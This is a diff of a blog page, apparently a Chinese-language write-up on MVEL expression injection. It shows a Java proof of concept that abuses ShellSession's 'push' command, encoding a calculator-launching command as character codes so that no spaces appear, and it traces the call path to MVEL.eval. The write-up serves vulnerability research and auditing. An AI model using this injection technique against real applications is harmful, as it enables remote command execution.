@@ -341,29 +341,64 @@
 </ul>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
 
-<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2> 
+<h2 id="MVEL-eval-expression"><a href="#MVEL-eval-expression" class="headerlink" title="MVEL.eval(expression)"></a>MVEL.eval(expression)</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313221728551.png"
+                      class="" title="image-20250313221728551"
+                > 
 
 <p>成功弹出了计算器，说明我们的java代码被正确的执行了。<br>此时可以得出如果我们在白盒审计中发现MVEL直接调用eval函数，那我们就可以插入恶意的java代码去造成命令执行。</p>
 <h2 id="ShellSession"><a href="#ShellSession" class="headerlink" title="ShellSession"></a>ShellSession</h2><p>这是个MVEL表达式里面的一个类，这个类也可以造成命令执行，但是需要对我们传入的字符串进行一定的处理。<br>且他造成命令执行的入口并不是eval函数，而是他有参构造函数的时候一步一步调用到eval。如果实例化的行为可控，那就可以造成漏洞。</p>
 <p>恶意代码</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String expression = &quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;;//这个是弹出计算器的命令</span><br><span class="line">        ShellSession shellSession = new ShellSession(expression);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4> 
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="ShellSession-String-init"><a href="#ShellSession-String-init" class="headerlink" title="ShellSession(String init)"></a>ShellSession(String init)</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222212134.png"
+                      class="" title="image-20250313222212134"
+                > 
 
 <p>他的有参构造函数调用了exec</p>
-<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4> 
+<h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222254259.png"
+                      class="" title="image-20250313222254259"
+                > 
 
 <p>这里将传入的字符串根据换行符分开，每次循环的时候取出一个，然后我们继续跟进_exec</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4> 
+<h4 id="exec"><a href="#exec" class="headerlink" title="_exec()"></a>_exec()</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222418477.png"
+                      class="" title="image-20250313222418477"
+                > 
 
 <p>这里会对我们刚才提取的inBuffer参数进行根据空格来分割，例如open -a Calculator 会分成 [‘open’,’-a’,’Calculator’]放入数组intokens里面<br>passParameters &#x3D; new String[inTokens.length - 1]提取了我们分隔出来的数组的最后一个参数，如例子那就是Calculator</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222659853.png"
+                      class="" title="image-20250313222659853"
+                > 
 
 <p>提取inTokens数组里面第一个作为类，然后去执行execute方法。</p>
-<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4> 
+<h4 id="pushContext类的利用"><a href="#pushContext类的利用" class="headerlink" title="pushContext类的利用"></a>pushContext类的利用</h4><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222824212.png"
+                      class="" title="image-20250313222824212"
+                > 
 
 <p>这里面是存在MVEL.eval()的函数调用的，如果args参数可控，我们即可造成漏洞。</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313222924300.png"
+                      class="" title="image-20250313222924300"
+                > 
 
 <p>所以我们要满足三个条件</p>
 <ul>
@@ -371,37 +406,92 @@
 <li>inTokens数组的长度要大于1，才会给我们的passParameters参数赋值</li>
 <li>this.commands.get(inTokens[0]))看看是否可以让他对应的类为pushContext</li>
 </ul>
-<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3> 
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223338551.png"
+                      class="" title="image-20250313223338551"
+                > 
 
 <p>跟进去</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223353224.png"
+                      class="" title="image-20250313223353224"
+                > 
 
 <p>走到有参构造这里，init字符串就是我们的恶意payload</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223434006.png"
+                      class="" title="image-20250313223434006"
+                > 
 
 <p>这里根据我们的\n符号去分隔我们的字符串，但是我们没有换行，有<strong>空格</strong> ，所以就没有被分隔</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223547230.png"
+                      class="" title="image-20250313223547230"
+                > 
 
 <p>继续跟进发现我们的字符串被空格分隔了，分成了push和后面的那部份</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223806525.png"
+                      class="" title="image-20250313223806525"
+                > 
 
 <p>此时如果inTokens里面的第一个参数是push，则可以指向我们的漏洞利用类</p>
 <p>因为inTokens&gt;1所以进入给参数赋值</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223658474.png"
+                      class="" title="image-20250313223658474"
+                > 
 
 <p>走到这里漏洞利用的地方</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223940229.png"
+                      class="" title="image-20250313223940229"
+                > 
 
 <p>就可以理解为pushContext.execute(this,我们的恶意java代码)</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313223907924.png"
+                      class="" title="image-20250313223907924"
+                > 
 
 <p>最后走向我们的MVEL的eval函数利用点</p>
- 
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224034230.png"
+                      class="" title="image-20250313224034230"
+                > 
 
 <p>最后弹出了计算器。</p>
 <h3 id="paylaod分析"><a href="#paylaod分析" class="headerlink" title="paylaod分析"></a>paylaod分析</h3><ul>
-<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开 </li>
-<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格</li>
+<li>首先我们需要用到类pushContext，又因为他获取这个类是从map里面get(key)提取的，push-&gt;pushContext，所以我们的恶意字符串第一个参数要为push，然后第二个参数是我们的恶意代码，恶意代码跟push会根据空格分开<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224215688.png"
+                      class="" title="image-20250313224215688"
+                > </li>
+<li>然后为什么不直接用open -a Calculator呢，因为这个命令中间也有空格，那参数就会被分开，所以需要转换为ascall码对应的字符串去拼接，就是中间不能出现空格<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/image-20250313224342726.png"
+                      class="" title="image-20250313224342726"
+                ></li>
 </ul>
 
 		</div>
